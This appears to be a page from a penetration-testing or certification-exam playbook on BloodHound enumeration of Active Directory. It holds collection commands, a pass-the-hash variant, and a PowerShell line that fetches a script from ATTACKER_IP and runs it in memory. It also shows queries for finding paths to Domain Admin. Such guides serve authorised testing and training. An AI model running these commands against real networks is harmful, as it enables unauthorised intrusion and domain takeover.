---
id: bloodhound
title: BloodHound Enumeration
stage: privesc
tags: [windows, ad]
summary: Map all attack paths from your current account to Domain Admin — run BloodHound before Kerberoasting, before Certipy, before anything else once you have valid creds.
leads_to:
  - acl-abuse
  - adcs-esc1
  - adcs-esc4
  - dcsync
  - kerberoast
  - kerberos-delegation
  - laps-abuse
---

## Prerequisites

Valid domain credentials (any user). Network access to the DC (port 389 LDAP or 88 Kerberos). BloodHound + Neo4j running on your attacker machine. bloodhound-python installed (or SharpHound if you have a Windows shell).

BloodHound is the map — every other AD attack is following the map. It visualizes ACL relationships, session data, group memberships, and trust paths that are invisible through manual enumeration. Run it with `-c All` immediately after getting any domain credential, before you do anything else. The "Shortest Paths from Owned Principals" query shows you exactly where you can go from where you are.

## Quick Win

> Collect from Linux — no shell on a Windows machine needed, just valid domain creds.

```bash
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All --zip
```

## Collect from Linux

> bloodhound-python runs remotely over LDAP — no agent on the domain required.

```bash
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All --zip
bloodhound-python -u 'account$' -hashes ':NTLM_HASH' -d $DOMAIN -dc $DC_IP -c All
```

## Collect from Windows

> SharpHound is the native ingestor — runs from any Windows shell.

```powershell
.\SharpHound.exe -c All --zipfilename loot.zip
.\SharpHound.exe -c All,GPOLocalGroup

# PowerShell version (download and run in memory)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

## Start BloodHound and Import

> Start neo4j, open BloodHound, drag-and-drop the zip to import.

```bash
sudo neo4j start
bloodhound
# Import: drag zip file into the BloodHound UI
```

## Step 1 — Mark Owned Nodes

> Right-click every account and machine you control → "Mark as Owned" — this unlocks the most useful queries.

```
Right-click every account and machine you control → "Mark as Owned"
```

## Step 2 — Run Queries in Order

> These five queries cover the most common exam attack paths — run them top to bottom.

```
Analysis → Pre-Built Queries:
1. Find Shortest Paths to Domain Admins
2. Shortest Paths from Owned Principals      ← YOUR path from your current position
3. Find Computers where Domain Users are LA  ← easy lateral move
4. Find Kerberoastable Users
5. Find Principals with DCSync Rights        ← check if you already have this
```

## Step 3 — Read Every Node You Land On

> Node Info panel reveals ACLs, local admin rights, and active sessions.

```
Click node → Node Info:
- Outbound Object Control  → ACLs this user has over other objects
- Local Admin Rights       → machines this user is local admin on
- Reachable High Value     → path to DA from this node
- Sessions                 → who is currently logged in here
```

## Leads To

BloodHound reveals the path — follow it. ACL edge (GenericAll, WriteDACL, etc.) → acl-abuse. Kerberoastable accounts → kerberoast. ADCS certificate templates → adcs-esc1 or adcs-esc4. ReadLAPSPassword or ReadGMSAPassword edge → laps-abuse. Unconstrained or constrained delegation → kerberos-delegation. DCSync rights already granted → dcsync.
